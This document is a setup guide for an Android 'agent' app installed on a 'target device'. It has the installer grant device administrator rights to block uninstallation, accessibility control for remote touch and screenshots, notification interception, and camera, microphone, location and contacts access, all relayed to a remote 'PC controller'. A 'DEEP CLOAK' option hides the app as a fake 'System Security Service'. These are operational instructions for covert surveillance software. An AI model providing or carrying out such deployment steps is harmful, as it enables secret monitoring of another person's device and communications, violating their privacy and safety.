# Android Agent Setup

Install the pre-built Android agent APK on the target device.

---

## No Flutter Required

The APK includes a built-in setup screen. After installation, users configure the
Render server URL directly within the app. No build tools, no source code editing.

---

## Step 1: Download the APK

Get the latest `app-release.apk` from the Releases page or build it yourself (see
"Building from Source" below).

---

## Step 2: Install and Launch

1. Transfer the APK to the target Android device.
2. Install it (enable "Install from unknown sources" if prompted).
3. Open the app.

---

## Step 3: Grant Permissions

The app shows a checklist of required permissions. Tap ACTIVATE on each one:

| Permission              | Why It Is Needed                          |
|-------------------------|-------------------------------------------|
| Device Administrator    | Prevents uninstallation                   |
| Accessibility Service   | Remote touch, screenshots, navigation     |
| Usage Access            | App usage statistics                      |
| Notification Listener   | Intercept and forward notifications       |
| Display Overlay         | Background camera access on some OEMs     |
| Unrestricted Battery    | Bypass Doze mode for 24/7 operation       |
| Hardware Sensors        | Camera, Microphone, Location, Contacts    |
| Notification Access     | Maintain background service on Android 14 |

---

## Step 4: Configure Server URL

After granting permissions, a **SERVER CONNECTION** card appears at the top of the checklist.

1. Enter your deployed Render WebSocket URL:
   ```
   wss://your-app-name.onrender.com/ws
   ```
2. Tap **SAVE & CONNECT**.

The app saves this URL persistently. It will auto-connect on every boot.

If you need to change the URL later, tap the displayed URL to edit it again.

---

## Step 5: Engage

Once all permissions are green and the server URL is configured:

1. Tap **ENGAGE PERSISTENT SHIELD** to activate the monitoring service.
2. The app transitions to "System Service" mode and begins relaying data to the PC controller.

---

## Step 6: Verify Connection

On the PC controller, the device should appear in the "Select Target Device" screen
with a green indicator.

---

## Icon Hiding (Optional)

The checklist includes a **ACTIVATE DEEP CLOAK** option. This hides the app icon from
the launcher and replaces it with a disguised "System Security Service" entry.

Alternatively, you can hide the icon after setup by tapping the top-left corner of the
black "System Service" screen 7 times rapidly to access the stealth controls panel.

---

## Building from Source (Advanced)

If you need to customize the app, you can build from source:

### Prerequisites
- Flutter SDK 3.x
- Android SDK

### Steps

1. Create a Firebase project at [Firebase Console](https://console.firebase.google.com/)
2. Add an Android app with package name `com.example.android_security`
3. Download `google-services.json` and place it in:
   ```
   frontend/android_security/android/app/google-services.json
   ```
4. Build the APK:
   ```bash
   cd frontend/android_security/
   flutter pub get
   flutter build apk --release
   ```
5. The output APK is at:
   ```
   build/app/outputs/flutter-apk/app-release.apk
   ```

Note: When building from source, the server URL is still configured at runtime
through the app's setup screen. No source code editing needed.

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| App crashes on launch | Ensure `google-services.json` is valid |
| Device not appearing on controller | Check the server URL matches your Render deployment |
| Camera not working on Oppo/Realme | Grant overlay permission and disable battery optimization |
| Service killed in background | Enable battery optimization bypass and device admin |
| "OFFLINE" on controller after reboot | The service auto-starts on boot if permissions are granted |
